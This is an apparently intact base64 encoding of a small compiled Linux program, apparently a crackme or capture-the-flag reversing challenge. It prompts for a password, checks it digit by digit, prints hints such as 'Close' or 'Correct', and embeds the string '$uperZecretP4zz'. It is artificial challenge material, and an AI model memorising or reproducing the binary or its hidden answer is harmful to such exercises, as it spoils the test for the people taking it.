AAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEiD7AhIiwXF\nLwAASIXAdAL/0EiDxAjDAAAAAAAAAAAA/zXKLwAA/yXMLwAADx9AAP8lyi8AAGgAAAAA6eD/////\nJcIvAABoAQAAAOnQ/////yW6LwAAaAIAAADpwP////8lei8AAGaQAAAAAAAAAAAx7UmJ0V5IieJI\ng+TwUFRFMcAxyUiNPc4AAAD/FS8vAAD0Zi4PH4QAAAAAAA8fQABIjT2BLwAASI0Fei8AAEg5+HQV\nSIsFDi8AAEiFwHQJ/+APH4AAAAAAww8fgAAAAABIjT1RLwAASI01Si8AAEgp/kiJ8EjB7j9IwfgD\nSAHGSNH+dBRIiwXdLgAASIXAdAj/4GYPH0QAAMMPH4AAAAAA8w8e+oA9DS8AAAB1K1VIgz26LgAA\nAEiJ5XQMSIs97i4AAOgp////6GT////GBeUuAAABXcMPHwDDDx+AAAAAAPMPHvrpd////1VIieVI\ngewgAQAASI0FmQ4AAEiJRejHRfwAAAAAx0X4AQAAAEiNBZAOAABIice4AAAAAOiv/v//SI2F4P7/\n/0iJxkiNBYEOAABIice4AAAAAOih/v//SI2F4P7//0iJx+hy/v//SIP4Bg+FxQAAAA+2heD+//88\nUHQZSI0FTA4AAEiJx7gAAAAA6Fn+///ptQAAAMdF9AEAAADrNotF9EiYD7aEBeD+//8PvsCD6DAB\nRfyLRfRImA+2hAXg/v//D77AjVDQi0X4D6/CiUX4g0X0AYN99AV+xIN9/Bh1QIF9+AAIAAB1Nw+2\nheH+//88OHUWSI0F2w0AAEiJx7gAAAAA6OH9///rQEiNBc0NAABIice4AAAAAOjL/f//6ypIjQXE\nDQAASInHuAAAAADotf3//+sUSI0FtA0AAEiJx7gAAAAA6J/9//+4AAAAAMnDSIPsCEiDxAjDAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAIAJHVwZXJaZWNyZXRQ\nNHp6AEVudGVyIHBhc3N3ZDogACVzAEFsbW9zdABDb3JyZWN0AHJlYWxseSBjbG9zZQBDbG9zZQBJ\nbmNvcnJlY3QAAAABGwM7KAAAAAQAAADM7///dAAAAAzw//+cAAAAHPD//0QAAAAF8f//tAAAABQA\nAAAAAAAAAXpSAAF4EAEbDAcIkAEHEBQAAAAcAAAA0O///yIAAAAAAAAAAAAAABQAAAAAAAAAAXpS\nAAF4EAEbDAcIkAEAACQAAAAcAAAAUO///0AAAAAADhBGDhhKDwt3CIAAPxo7KjMkIgAAAAAUAAAA\nRAAAAGjv//8IAAAAAAAAAAAAAAAcAAAAXAAAAEnw//9PAQAAAEEOEIYCQw0GA0oBDAcIAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFARAAAAAAAAEBEAAAAA\nAAABAAAAAAAAAD8AAAAAAAAADAAAAAAAAAAAEAAAAAAAAA0AAAAAAAAAqBIAAAAAAAAZAAAAAAAA\nANA9AAAAAAAAGwAAAAAAAAAIAAAAAAAAABoAAAAAAAAA2D0AAAAAAAAcAAAAAAAAAAgAAAAAAAAA\n9f7/bwAAAACgAwAAAAAAAAUAAAAAAAAAoAQAAAAAAAAGAAAAAAAAAMgDAAAAAAAACgAAAAAAAACv\nAAAAAAAAAAsAAAAAAAAAGAAAAAAAAAAVAAAAAAAAAAAAAAAAAAAAAwAAAAAAAADoPwAAAAAAAAIA\nAAAAAAAASAAAAAAAAAAUAAAAAAAAAAcAAAAAAAAAFwAAAAAAAABoBgAAAAAAAAcAAAAAAAAAqAUA\nAAAAAAAIAAAAAAAAAMAAAAAAAAAACQAAAAAAAAAYAAAAAAAAAPv//28AAAAAAAAACAAAAAD+//9v\nAAAAAGgFAAAAAAAA////bwAAAAABAAAAAAAAAPD//28AAAAAUAUAAAAAAAD5//9vAAAAAAMAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAA4D0AAAAAAAAAAAAAAAAAAAAAAAAAAAAANhAAAAAAAABGEAAAAAAAAFYQAAAAAAAA\nAAAAAAAAAAAgQAAAAAAAAEdDQzogKERlYmlhbiAxMi4yLjAtMSkgMTIuMi4wAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAACQAAAAEABAB8AwAAAAAAACAA\nAAAAAAAAEwAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAHgAAAAIADwCgEAAAAAAAAAAAAAAAAAAAIAAA\nAAIADwDQEAAAAAAAAAAAAAAAAAAAMwAAAAIADwAQEQAAAAAAAAAAAAAAAAAASQAAAAEAGgAoQAAA\nAAAAAAEAAAAAAAAAVQAAAAEAFQDYPQAAAAAAAAAAAAAAAAAAfAAAAAIADwBQEQAAAAAAAAAAAAAA\nAAAAiAAAAAEAFADQPQAAAAAAAAAAAAAAAAAApwAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAEwAAAAQA\n8f8AAAAAAAAAAAAAAAAAAAAArgAAAAEAEwAoIQAAAAAAAAAAAAAAAAAAAAAAAAQA8f8AAAAAAAAA\nAAAAAAAAAAAAvAAAAAEAFgDgPQAAAAAAAAAAAAAAAAAAxQAAAAAAEgBUIAAAAAAAAAAAAAAAAAAA\n2AAAAAEAGADoPwAAAAAAAAAAAAAAAAAA7gAAABIAAAAAAAAAAAAAAAAAAAAAAAAACwEAACAAAAAA\nAAAAAAAAAAAAAAAAAAAAXAEAACAAGQAYQAAAAAAAAAAAAAAAAAAAJwEAABAAGQAoQAAAAAAAAAAA\nAAAAAAAALgEAABICEACoEgAAAAAAAAAAAAAAAAAANAEAABIAAAAAAAAAAAAAAAAAAAAAAAAARwEA\nABIAAAAAAAAAAAAAAAAAAAAAAAAAWgEAABAAGQAYQAAAAAAAAAAAAAAAAAAAZwEAACAAAAAAAAAA\nAAAAAAAAAAAAAAAAdgEAABECGQAgQAAAAAAAAAAAAAAAAAAAgwEAABEAEQAAIAAAAAAAAAQAAAAA\nAAAAkgEAABAAGgAwQAAAAAAAAAAAAAAAAAAAYAEAABIADwBwEAAAAAAAACIAAAAAAAAA